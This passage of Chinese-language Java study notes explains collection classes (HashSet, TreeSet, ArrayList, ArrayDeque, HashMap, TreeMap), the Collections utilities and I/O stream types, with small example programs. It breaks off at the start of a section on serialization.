以上这些实现类中，`HashSet、TreeSet、ArrayList、LinkedList、ArrayDeque`这5个类要重点掌握。


Java中的容器类的使用。  
1、要使用接口作变量，而不是使用类做变量。
>
	Collection<String> c1 = new HashSet<>();

这里使用了接口Collection做变量，而没有使用类HashSet作变量。  
同时，这里的Collection使用泛型规定了容器中对象类型，那么后面的类HashSet就可以不必写出对象类型，这就是所谓的“菱形语法”。

`Removeall()`与`addall()`是针对容器与容器之间的操作。  
`Retainall()`是容器之间求交集的操作。  
遍历`Set`集合使用迭代器：
>
	Iterator it = c1.iterator();//创建迭代器
	while(it.hasNext())
	{
		System.out.println(it.next());//使用迭代器
	}

遍历`Set`集合使用foreach循环：
>
	for（String elem：c1）
	{
	}

Java中的HashSet
--------------------
`HashSet`的存储机制：其底层是一个数组。  
`HashSet`的构造器：`HashSet(int initialCapacity, float loadFactor)`。  
这里的参数分别是：  
a. 数组的长度，但是不一定是实际数组的长度，因为这里的数组的长度永远是2的n次方，这样数组实际的长度是最接近与2的n次方的。  
>
	HashSet<String> ha = new HashSet<>(3);//底层数组长度自动扩展到4。

实际上`HashSet`的工作原理是：当感觉底层数组的空间不足的时候，就会自动创建一个长度扩充一倍的底层数组，将原数组中的东西复制倒入，原数组变为垃圾等待回收。这个过程叫**重hash**。

b. 负载因子：
那么怎样的时候才叫感觉空间不足？就是当已使用的空间占总空间比例达到负载因子的时候。负载因子是一个小数。默认0.75，底层数组长度默认16；

`HashSet`存入元素的机制：  
1. 当有对象元素要存入的时候，会调用这个**对象元素**的`HashCode()`方法，获得一个`hash`值。  
2. 根据返回的`hash`值，计算出这个对象元素在底层数组中的存储位置（也就是数组中的索引）。`Hash`值一样则存储位置一样。  
3. 如果要放入的位置是空的，那么直接放入即可。  
4. 如果该位置上已经有了元素，就会在此位置上形成链表，同一个位置上的元素形成链表。

`HashSet`取出元素的机制：  
1. 当要从`HashSet`中取出一个对象元素的时候，会调用这个对象元素的`HashCode()`方法，获得一个`hash`值。  
2. 根据返回的`hash`值，即得出这个对象元素在底层数组中的存储位置。  
3. 如果该位置恰好是要找的元素，直接取出来即可。  
4. 如果这个位置是一个链表，就需要挨个遍历这个链表，直到找到我们要的元素对象。无链表的时候，效率最高。

最理想的情况下，`HashSet`的性能可以接近于数组。  
这里可以知道，当负载参数过大的时候，会导致`HashSet`被装得过满，这样导致数组元素位置相重，进而导致链表的出现。降低`HashSet`的性能。  
注：当我们要将一个对象元素存入到`Hash`表中的时候（`HashSet/HashMap`），需要在这个类的对象中重写`HashCode()`方法，因为存入或者取出这个对象元素的时候，都要使用它的`HashCode()`方法。
>
    //the use of hashcode() in the HashSet
    //the override of equals()
    import java.util.*;
    class A
    {
	    private int count;
    	public A(int acount)
	    {
		    this.count=acount;
	    }
    	//类的判等equals()重写。
	    public boolean equals(Object obj)
	    {
		    if(this==obj)
		    {
			    return true;
		    }
		    if(obj!=null&&obj.getClass()==A.class)
		    {
			    A targetobj=(A)obj;
			    if(this.count==targetobj.count)
			    {
				    return true;
			    }
		    }
		    return false;
    	}
	    public int f()
    	{
    		return this.count;
    	}
    	public int hashCode()
    	{
    		return 20;
    	}
    }
    public class hashSetTest2
    {
	    public static void main(String[] args)
	    {
	    	HashSet<A> ha = new HashSet<>();
	    	ha.add(new A(1));
	    	ha.add(new A(1));
	    	ha.add(new A(1));
    		System.out.println(ha);
	    	for(A a:ha)
	    	{
	    		System.out.println(a.f());
    		}
    	}
    }


`hashSet`怎样才认为两个对象能够放在底层数组中相同的位置？ 
> 
1. 这两个对象的`hashCode()`返回值相等。也就是要求两个对象返回的存储位置是一样的。  
2. 两个对象通过`equals()`方法判等返回`true`。因为如果对象本身都不相等，那么就没有放在相同位置的必要了。  

这样就要求我们类的自定义方法`hashCode()`与`equals()`是一致的。  
这里的一致，指的是必须在这两个方法中要考虑相同多的类属性。  
如：
>
在`equals()`方法中要保证`name`与`num`属性都相等才行，那么在`hashCode()`方法中也必须使用这两个属性来求出`hash`值，从而保证返回的`hash`值能够代表这个两个属性。俱缺一不可。

这两个方法相对于上面的必须改写为：
>
    public boolean equals(Object obj)
	{
		if(this==obj)
		{
			return true;
		}
		if(obj!=null&&obj.getClass()==A.class)
		{
			A targetobj=(A)obj;
			if(this.count==targetobj.count&&this.name.equals(targetobj.name))
        	{
    	        return true;
    	    }
    	}
    		return false;
    }
    public int hashCode()
    {
    	return this.name.hashCode()+this.count;
    }

HashSet的使用：
>
	import java.util.*;
	class apple
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
			
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
	
			}
	
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class hashSetTest
	{
	
		public static void main(String[] args)
		{
			//the use of LinkedHashSet
			//class String has it's own equals() and hashcode() method.
			LinkedHashSet<String> hp = new LinkedHashSet<>();
			hp.add("张三");
			hp.add("李四");
			hp.add("王五");
			hp.add("赵六");
			System.out.println(hp);
	
			//the use of HashSet
			//class apple do not has it's own equals() and hashcode() method.
			HashSet<apple> hp1 = new HashSet<>();
			hp1.add(new apple("green",4.3));
			hp1.add(new apple("blue",6.7));
			hp1.add(new apple("black",5.3));
	
			System.out.println(hp1);
		}
	
	}

`HashSet`的子类`LinkedHashSet`  
其存储机制与`HashSet`类似，但是，`HashSet`的底层机制是一个数组(顺序表），而且数据存放位置是一个无顺序的，也就是与放入时顺序无关的，这样，遍历整个`Hashset`的时候就是无序的。  
而`LinkedHashSet`的底层机制是一个链表，这样，在链表中顺序就和放入对象的顺序是一致的，这样在遍历`linkedHashSet`的时候，就是有序的，与放入顺序一样。

Java中的TreeSet
-----------------
特征：保证`Set`中的元素对象都是已经排好序的，排序的目的在于便于查找、检索。  
对于字符串，按首字母的`ASCII`码排序。  
TreeSet是标准的“红黑树”；  
树——>二叉树——>排序二叉树(左子节点小于`root`节点小于右子节点）——>平衡排序二叉树(AVL：任何节点的树高度差不大于1且是排序二叉树，保证整棵树的权值最小)——>红黑树。  
树：**二叉树**（普通二叉树、排序二叉树、AVL树（平衡排序二叉树））、**红黑树**、**扩展树**。**B树**。  
其中，二叉树、红黑树、扩展树是用于内存中元素的管理。B树是用于外存（例如硬盘中数据元素的管理的）。

`TreeSet`的底层用一棵红黑树。红黑树的存入、检索性能很好。  
在没有出现大量的“链表（位置重合、重hash）”的情况下，`HashSet`的性能比`TreeSet`的好。而`TreeSet`不受此影响。

`TreeSet`相对于`HashSet`的优点： 
> 
1. `HashSet`中有一定量的空间是空的（内存的浪费），而`TreeSet`的空间利用率要高。  
2. `TreeSet`可以保证集合元素是有序的。

由于`TreeSet`中元素是有序的，所以要求放入到`TreeSet`中的元素对象是可以比较大小的。

TreeSet在比较中认为两个元素对象相等的标准：  
只要这两个元素对象通过`compareTo()`方法返回值是0，那么`TreeSet`就认为两对象相等。而与`equals()`方法无关（只与`compareTo()`方法有关）。所以我们要重写放入`TreeSet`中的元素对象的所属类中`compareTo()`方法。这个方法是`comparable`接口中的方法，所以，对于我们自己所写的类，必须要实现这个接口中这个唯一的这个方法。如果是**JDK**已有的类，我们就不必去自己实现这个方法了，因为已有的类已经实现了这个方法。 
 

  
  

TreeSet容器中比较元素对象大小的两种方式：  
>
1. 自然排序：那么如果**JDK**中存在的类已经实现了`compareTo()`，不用我们去重写这个方法。这个就是所谓的*自然排序*。  
也就是我们自己放入的类对象自己已经实现Comparable接口。已经重写了里面的`compareTo()`这个方法。这个方法被自动用于元素大小比较和排序。无需我们自己再次重写。  
元素实现了这个接口之后，元素自身就是可以进行排序的。  
2. 定制排序：对于我们自己写的类，需要自己去实现这个`compareTo()`方法或者我们对于**JDK**中已有的类希望按照自己想要的方式继续排序，就需要在创建`TreeSet`的使用要传入一个`Comparator`对象，这就是所谓的*定制排序*。  
在创建`TreeSet`的时候，提供一个`Comparator`对象，该对象可负责对元素进行比较大小。这里集合中元素对象无需实现`comparable`接口（本身无排序功能）。这里的`TreeSet`就需要在构造的时候传入一个`Comparator`对象，由于Comparator实际上是一个接口。*所以传入的是一个`Comparator`匿名内部实现类*。这个*匿名类产生的对象*用于进行比较。

TreeSet的使用
>
	import java.util.*;
	class apple 
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class treeSetTest
	{
		public static void main(String[] args)
		{
			//use TreeSet class
			//class String has implements the interface comparable itself that we do not have to implement it by ourselves.
			TreeSet<String> ts = new TreeSet<>();
			ts.add("张三");
			ts.add("李四");
			ts.add("王五");
			ts.add("赵六");
			System.out.println(ts);
>	
			//use TreeSet class
			//class apple do not has implements the interface comparator itself that we must implement it by ourselves。In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeSet<apple> ts1 = new TreeSet<>(new Comparator<apple>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeSet.
			@Override
			public int compare(apple o1,apple o2)
			{
				if(o1.weight>o2.weight)
				{
					return 1;
				}
>		
				else if(o1.weight<o2.weight)
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
>	
			});
>	
			ts1.add(new apple("green",4.3));
			ts1.add(new apple("blue",6.7));
			ts1.add(new apple("black",5.3));
			System.out.println(ts1);
>	
			//use TreeSet class
			//class String has implements the interface comparator itself but we want it compare as the method we want 
			//that we implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeSet<String> ts2 = new TreeSet<>(new Comparator<String>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeSet.
			@Override
			public int compare(String o1,String o2)
			{
				if(o1.length()>o2.length())
				{
					return 1;
				}
>		
				else if(o1.length()<o2.length())
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
>	
			});
			ts2.add("green");
			ts2.add("blue");
			ts2.add("esddfa");
			System.out.println(ts2);
		}
	}

Java中的List接口
-----
`List`接口就是用于线性结构类的。  
其特征就是：可以依据元素的`index`来存、取元素对象。    
`List`接口中有大量的依据`index`来进行操作的方法。所谓的依据`index`进行操作就是：在操作的时候告诉你的是元素的`index`，就是编号。即使是链表，告诉你的也是`index`编号，这就是所谓的依据`index`进行操作。链表和顺序表都是告诉你元素编号的。

同样，这里的`List`接口一般都用来创建引用变量，引用它的子类实例，以此体现多态。  
但是要注意的一点就是，如果使用接口创建的引用变量来引用子类实例，那么在要使用子类才有的方法之前，必须要先进行强制类型转换为子类实例变量。  

由于可以依据`index`访问元素，所以其多了一种遍历方式：
>
	List<String> ls = new ArrayList<>();
	for(int i=0;i<ls.size();i++)
	{
		System.out.println(ls.get(i));
	}

1. `ArrayList`实现类  
这个类实现了`List`接口，底层是一个数组。  
2. `Vector`实现类  
这个类和`ArrayList`相似，底层都是一个数组。这二者的性能非常快，比`hashSet`还快。但只是在查找的时候快，在删除、插入的时候很慢。  
`ArrayList`与 `Vector`的区别:  
`Vector`从**JDK1.4**被`ArrayList`代替，所以，能不用`Vector`就不用。`Vector`是线程安全的（但是实现很糟糕），`ArrayList`是线程不安全的。`ArrayList`的性能更好。即使在多线程情况下也不要使用`Vector`，而是通过`Collections`工具类来将`ArrayList`转换包装为线程安全的。    
3.  `LinkedList`实现类  
特征：即是线性表、又是队列、还是栈。  
其底层是基于链表实现的。**通常**认为性能比不上`ArrayList`。在存取的时候性能很好，在查找的时候很慢。因为它也是根据索引进行操作的，也就是说，在操作的时候告诉`LinkedList`的依旧是`index`。

Java中的Queue接口
---------
`queue`接口唯一的继承接口是`Deque`。  
功能既是队列(`queue`)又是栈(`stack`)。两端都可出可入。实际上就是功能受限制的线性表。实际上就是继承线性表而来的。

`Deque`作栈使用：
>
	import java.util.*;
	public class dequeStackTest
	{
		public static void main(String[] args)
		{
			Deque<String> de = new ArrayDeque<>();
>
			//push the elems into the ArrayDeque
			de.push("hi");
			de.push("hello");
			de.push("world");
			de.push("that");
			de.push("is");
>
			//pop the elems out of the ArrayDeque
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
>	
			//push the elems
			de.push("hi");
			de.push("hello");
			de.push("world");
			de.push("that");
			de.push("is");
>		
			//peek the elems of the ArrayDeque, peek but not remove
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
		}
	}

`Deque`作队列使用：
>
	import java.util.*;
	public class dequeQueueTest
	{
		public static void main(String[] args)
		{
			Deque<String> de = new ArrayDeque<>(); 
>			
			//insert at the end of the arraydeque.
			de.offer("hello");
			de.offer("world");
			de.offer("good");
>
			//poll the elem 
			System.out.println(de.poll());
>
			//peek the elem
			System.out.println(de.peek());
		}
	}


`Deque`具有两个子类：  
1. 基于数组的实现，`ArrayQueue`  
2. 基于链表的实现，`LinkedList`

`Deque`只是一个接口，所有的方法都是依靠实现类：`ArrayQueue`与`LinkedList`实现。


Java中的操作集合的工具类
---------------
工具类：  
`Arrays`类：操作数组。  
`Objects`类：操作对象。  
`Collections`类：操作集合。  
`Integer`类：操作将`String`转换为`Integer`。

当我们在已有的这个类中没有找到所需要的方法的时候，要达到我们的目的，就需要自己去写这个方法，这个时候要注意把这个方法包装放在一个类中，作为`static`方法出现，这样才是良好的面向对象方法。
>
我们有一个`String`数组，需要依据数组的元素去确定这个元素的`index`，这个时候，发现工具类`Arrays`中并没有这种方法。  
所以需要自己去创建这个方法`int find(String[] strArrays,String str)`，要将它包装在一个类中。
>
	//find the index of the elem in the array 
	class arraysUtil
	{
		static int find(String[] strArrays,String str)
		{
			int len = strArrays.length;
			int i=0;
			for(;i<len;i++)
			{
				if(str.equals(strArrays[i])==true)
				{
					return i;
				}
			}
			return -1;
		}
	}
`Collections`所有方法都是`static`方法。
>
	import java.util.*;
	public class collectiosTest
	{
		public static void main(String[] args)
		{
			List<String> ls = new ArrayList<>();
>			
			ls.add("hi");
			ls.add("hello");
			ls.add("good");
			System.out.println(ls);
>
			//reverse the List
			Collections.reverse(ls);
			System.out.println(ls);
>
			//swap the specific elems in the list
			Collections.swap(ls,1,2);
			System.out.println(ls);
>
			//shuffle the elems in the list
			Collections.shuffle(ls);
			System.out.println(ls);
		}
	}


`synchronizedXXX(Collections<T> cl)`：用于将集合包装成线程安全的集合。

所谓的重构：就是让方法适用于更多的情况。

Java中的map
--------
`map`里面存放的东西是：很多的`key-value`对。每一项数据都是这样的键值对。也就是说，`map`就是很多的`key-value`对的集合。
  
`map`中将`value`当做`key`的附属物。在`key-value`的存储中，只需考虑`key`的存储即可。可以存储之后，`value`会跟着`key`进行存储。  
如果，只考虑`key`的存储，那么将所有的`key`存储在一起，就是一个`Set`。 
 
实际上，`map`与`Set`的一一对应的：
`HashSet`的底层是依靠`HashMap`实现的，`HashMap`依靠`hash`算法以确定在其底层数组中的位置。  
`TreeSet`的底层是依靠`TreeMap`实现的，`TreeSet`底层就是一个**红黑树**。
  
常用的实现了`map`接口的类有3个：`HashMap`与`TreeMap`、`HashTable`。  
a. `HashMap`  
会根据其存、取的元素对象的`key`值的`hashCode()`方法的返回值来确定这个`key`值的存放位置，也随之确定`key-value`对的储存位置。  

*`HashMap`也不允许`key`重复。那么怎样才是`key`重复。*  
- 通过`equals()`返回`true`.    
- 通过`hashCode()`返回值相等.   
那么，在我们用一个**自己写的类**作为`HashMap`的`key`的时候，必须要自己正确地重写这个类的`equals()`方法和`hashCode()`方法；  
但是对于已经在**JDK**中有的类，我们就不必自己重写这两个方法。因为**JDK**中的类继承自Object类，都已经实现了这两个方法。  
`HashMap`实际上是无序放置的，所以，为了有序存、取。可以使用`HashMap`的子类`LinkedHashMap`来进行存取。这样就是有序的。

`HashMap`的使用:
>
	import java.util.*;
	class apple
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
>			
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class hashmapTest
	{
		public static void main(String[] args)
		{
			//the use of LinkedHashMap
			//class String has it's own equals() and hashcode() method.
			LinkedHashMap<String,Integer> hp = new LinkedHashMap<>();
			hp.put("张三",90);
			hp.put("李四",80);
			hp.put("王五",70);
			hp.put("赵六",60);
			System.out.println(hp);
>	
			//the use of HashMap
			//class apple do not has it's own equals() and hashcode() method.
			HashMap<apple,Integer> hp1 = new HashMap<>();
			hp1.put(new apple("green",4.3),4);
			hp1.put(new apple("blue",6.7),5);
			hp1.put(new apple("black",5.3),6);
>	
			System.out.println(hp1);
		}
	}  

b. `TreeMap`  
其底层的红黑树只对`key`进行排序放置。这就表示`key`必须是可以比较大小的。  
- 自然排序：对于`key`都要实现`Comparable`接口。  
- 定制排序：要求在创建`TreeMap`的时候提供一个`Comparator`以实现比较。

*`TreeMap`也不允许`key`重复。那么怎样才是`key`重复。*  
- 只要这两个元素对象通过`compare()`方法返回值是0，那么`TreeSet`就认为二对象相等。而与`equals()`方法无关（只与`compare()`方法有关）。所以我们要重写放入`TreeSet`中的元素对象的所属类中`compareTo()`方法。这个方法是`comparable`接口中的方法，所以，对于我们自己所写的类，必须要实现这个接口中这个唯一的这个方法。

如果是**JDK**已有的类，我们就不必去自己实现这个方法了，因为已有的类以及实现了这个方法。这就是*自然排序*。  
 
对于我们自己写的类需要自己去实现这个`compare()`方法或者我们对于JDK中已有的类希望按照自己的方式去排序，就需要在创建`TreeMap`的使用要传入一个`Comparator`对象，这就是所谓的*定制排序*。  
也就是说在我们用一个**自己写的类**作为`TreeMap`的`key`的时候，必须要自己正确地使这个类实现`Comparator`接口的`compare()`方法；实际上采用的是匿名内部类的形式给`hashMap`提供一个`Comparator`对象。

`TreeMap`的使用
>
	import java.util.*;
	class apple 
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
>	
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
>			
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class TreeMapTest
	{
		public static void main(String[] args)
		{
			//use TreeMap class
			//class String has implements the interface comparable itself that we do not have to implement it by ourselves.
			TreeMap<String, Integer> ts = new TreeMap<>();
			ts.put("张三",90);
			ts.put("李四",80);
			ts.put("王五",70);
			ts.put("赵六",60);
			System.out.println(ts);
>	
			//use TreeMap class
			//class apple do not has implements the interface comparator itself that we must implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeMap<apple,Integer> ts1 = new TreeMap<>(new Comparator<apple>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeMap.
			@Override
			public int compare(apple o1,apple o2)
			{
				if(o1.weight>o2.weight)
				{
					return 1;
				}
>		
				else if(o1.weight<o2.weight)
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
>	
			ts1.put(new apple("green",4.3),4);
			ts1.put(new apple("blue",6.7),5);
			ts1.put(new apple("black",5.3),6);
			System.out.println(ts1);
>	
			//use TreeMap class
			//class String has implements the interface comparator itself but we want it compare as the method we want 
			//that we implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeMap<String,Integer> ts2 = new TreeMap<>(new Comparator<String>(){
			@Override
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeMap.
			public int compare(String o1,String o2)
			{
				if(o1.length()>o2.length())
				{
					return 1;
				}
>		
				else if(o1.length()<o2.length())
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
			ts2.put("green",4);
			ts2.put("blue",5);
			ts2.put("esddfa",6);
			System.out.println(ts2);
		}
	}

c. `HashTable`  
`HashTable`与`HashMap`的区别：  
- `HashTable`自**JDK1.0**开始即有，已落后，能不用就不用。与`Vector`类似。    
- `HashTable`不允许使用`null`作`key`值，但是`HashMap`允许。  
- `HashTable`是线程安全的(但是实现不好),`HashMap`线程不安全，但是性能好。可以通过`Collections`工具类将`HashMap`类包装成线程安全的。所以尽量不用`HashTable`。  
- 除以上几点之外，其他的都是相同的。

总之，无论是`Set`还是`Map`。  
1. 前面带了`Hash`表明的是这个集合存、取元素寻找位置的方式是通过`equals()`方法和`hashCode()`方法的返回值来确定存、取元素在底层数组中的位置的。  
2. 前面带了`Tree`表明的是这个集合存、取元素的是在红黑树中进行的，这个排序过程是通过两种方式进行的，只有元素对象具有排序功能，就能够在红黑树中进行存、取。  
要么是对象本身就拥有比较功能，也就是**JDK**中已经提供了。要么就是我们自己写的类，需要在定义集合的时候向这个集合中通过匿名内部类的形式传入`Comparator`对象。


`Iterator`接口：用于遍历一个集合中的元素。





Java中的异常处理
----------------



Java中的输入与输出
-----------
所谓的输入与输出，实际上就是以内存为中心，硬盘↔内存，内存→显示屏，键盘→内存。这三者之间的信息传输的过程。

`File`类：代表硬盘里面的一个文件或者目录。  
`File`类的方法：  
1. `listRoots()`：列出所有的根目录。  
2. `exists()`:判断文件、目录的存在。  
3. `getPath()`:获取文件的路径。  
4. `mkdir`:创建文件。  
5. `listFiles()`：列出当前目录下所有的文件。  
6. `listFiles(FileFilter filter)`：列出当前目录下符合条件的文件与目录。  
7. `listFiles(FilenameFilter filter)`：列出当前目录下符合条件的文件与目录。  
  
`I/O`流：`File`类只能访问磁盘中的文件与目录，但是不能读取文件。  
如果要读取文件，就需要使用`I/O`流。  
按流的方向来分：  
>
输入、输出流都是在内存的角度来看的。  

按流处理的数据来分：  
>
字节流：处理的对象是字节。功能强大，例如：图片、音乐。  
字符流：处理的对象时字符。主要用于文本文件，如：`txt`文件。处理文本文件时，比字节流更方便。

按流的角色来分：  
>
节点流：直接与一个`I/O`的物理节点（如，磁盘上的文件、网络等）关联。  
包装流(处理流/过滤流)：以节点流为基础，包装之后得到的流。  

常用的有4个抽象流类：  
`InputStream`、`OutputStream`：字节流。  
`Reader`、`Writer`：字符流。  
所有的`I/O`流都是以以上的四个流为基础的。
  
**一个流对象相当于一根水管**，里面的每一滴水就相当于一个数据单元，如果是字节流，那就是一个字节。如果是字符流，那就相当于一个字符。  
对于输入流而言，创建一个输入流对象的时候，里面就有数据。  
例如:将一个文件`File`对象包装进一个输入流对象。里面就拥有了水滴。我们要做的就是将这个输入流对象中的那些数据传送到程序中，也就是内存中。  
对于输出流而言，是不同的。创建一个输出流对象的时候，里面是没有数据的，也就是说里面没有水滴，我们所要做的就是将程序中所产生的数据传送到这个空水管中。  

下面从流的角色分类进行讨论：  
A. 节点流类：  
a. 文件节点流（与文件相连接，对文件内容进行操作）。  
b. 数组节点流（与字节、字符数组相连接，对数组内容进行操作）。  
c. 管道节点流（与管道相连接，对管道内容进行操作）。  
d. 字符串节点流（与字符串相连接，对字符串内容进行操作）。  


**文件节点流**：用于访问文件的节点流。他们和文件相连接。  
`FileInputStream`、`FileOutputStream`：字节流。  
`FileReader`、`FileWriter`：字符流。  

`FileInputStream`方法：  
1. `read()/read(byte[] b)`：将文件中的字节读入到内存中。  

`FileOutputStream`方法：  
1. `write(byte[] b)`：将内存中的`byte`数组写入到文件中。

文件节点流类使用举例：
>
	import java.io.*;
	import java.util.*;
	public class fileStreamTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a fileinputstream,just like get a pipe with water in it.that you can pipe the water into the RAM.
			FileInputStream fis = new FileInputStream("E:/Java_source/fileStreamTest.java");
>
			//read the file by one byte
			System.out.print((char)fis.read());
>
			//read all the file by bytes 
			byte[] buffer1 = new byte[64];
			int len1 = 1;
			while((len1 = fis.read(buffer1))!=-1)
			{
				System.out.print(new String(buffer1,0,len1));
			}
>
			//read the file by bytes into a specified length buffer arrays 
			FileInputStream fis1 = new FileInputStream("E:/Java_source/fileStreamTest.java");
			byte[] buffer = new byte[128];
			fis1.read(buffer);
			System.out.println(new String(buffer));
>
			//output into the file with the FileOutputStream class 
			FileOutputStream fis2 = new FileOutputStream("E:/Java_source/2.java");
			byte[] buffer3 = "hello".getBytes();
			fis2.write(buffer3);
			fis2.close();
		}
	}



**数组节点流类**：用于访问数组。它们和数组相连接。  
`ByteArrayInputStream`、`ByteArrayOutputStream`：访问字节数组流类。  
`CharArrayReader`、`CharArrayWriter`：访问字符数组流类。

数组节点流类使用举例：  
>	
	import java.io.*;
	public class ArrayStreamTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a ByteArrayOutputStream,just like get a pipe without water in it.that you can pipe water into it.
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
>
			byte[] buffer = "hello".getBytes();
			bos.write(buffer);
>		
			byte[] content = bos.toByteArray();
			for(byte b : content)
			{
				System.out.println((char)b);
			}
		}
	}


**管道节点流类**：用于访问管道。它们和管道相连接。  
`PipedInputStream`、`PipedOutputStream`：访问管道流类。  
`PipedReader`、`PipedWriter`：访问管道流类。  
所谓的管道：两个进程之间进行通信的连接。

**字符串节点流类**：用于访问字符串。他们与字符串相连接。它们就没有字节流类了，只有字符流类。  
`StringReader`、`StringWriter`：访问字符串流类。以字符串作为节点。  


System.in就是一个字节流对象，其就是和键盘相联系的。  
System.out也是一个字节流对象，是与显示器相联系的。
B. 包装流类：就是将别的流类包装成新的流类。节点流是直接与I/O节点（文件、键盘、网络、磁盘等）相关联，包装之后成为包装类效率更高。   
a. 缓冲流类。  
b. 过滤流类。  
c. 打印流类。  
d. 转换流类。  

**缓冲流类**：由于内、外存的读取速度不一样。所以需要缓冲流类来进行缓冲。缓冲流类实际上是通过*将其他的节点流类包装形成的新的缓冲流类*。建立于过滤流之上。其好处是可以调用`readLine()`每次读取一行。
`BufferedInputStream`、`BufferedOutputStream`：实际上是`inputStream`、`outputStream`包装而成的流类。  
`BufferedReader`、`BufferedWriter`：实际上是`Reader`、`Writer`包装而成的流类。    

**过滤流类**：实际中我们在程序中并不是直接使用节点流类，而是使用通过包装各节点流类的过滤流类。实际上过滤流类是*抽象类*，不能直接将过滤流类进行示例话。所以，都是通过包装成*缓冲流类*进行使用的。  
使用过滤流的优点：  
1. 其建立在节点流的基础之上，可以消除节点流之间的差异，这样就会更加方便地进行面向过滤流编程。  
2. 使用过滤流的方法进行**I/O**更加便捷。  
`FilterInputStream`、`BufferedOutputStream`:  
`FilterReader`、`FilterWriter`：

**打印流类**：用于在屏幕、打印机等上面打印的流类。
`printStream`、`printWriter`：分别是`FileOutputStream`、`FileWriter`这两个节点流包装而来。包装之后更加方便。

**转换流类**：用于将字节流转换为字符流。很有用。  
`InputStreamReader`、`OutputStreamWriter`:转换流类。

转换流类、缓冲流类使用示例：
>
	import java.io.*;
	public class StreamReaderTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct args Stream class
			FileInputStream fis= new FileInputStream("E:/Java_source/fileStreamTest.java");
>		
			//transform the stream class into a reader class
			InputStreamReader reader = new InputStreamReader(fis);
>
			//transform the reader class into a Bufferedreader class
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
>		
		}
	}


**两个特殊的流对象**：`DataInputStream`、`DataOutputStream`,它们继承了过滤流。  
它们的特点就是：拥有的方法更多，可以读、写各种数据。  

所有以`InputStream`结尾的流类都是*字节输入流*。  
所有以`OutputStream`结尾的流类都是*字节输出流*。  
所有以`Reader`结尾的流类都是*字符输入流*。  
所有以`Writer`结尾的流类都是*字符输入流*。  

**两个特殊的流对象**：`ObjectInputStream`、`ObjectOutputStream`，这两个类是用于序列化储存对象或者。见Java中的序列化。  


Java中的序列化
--------------------
`Java`中的一切都是对象，放在内存中，我们常需要将`Java`中的对象通过序列化转换成二进制流来进行储存或者传输。  
转换成二进制流的目的：  
1. 我们有时候需要将对象储存在**外部存储器**中,这样，即使在程序结束运行之后，我们依旧可以从磁盘中将这个对象恢复出来。  
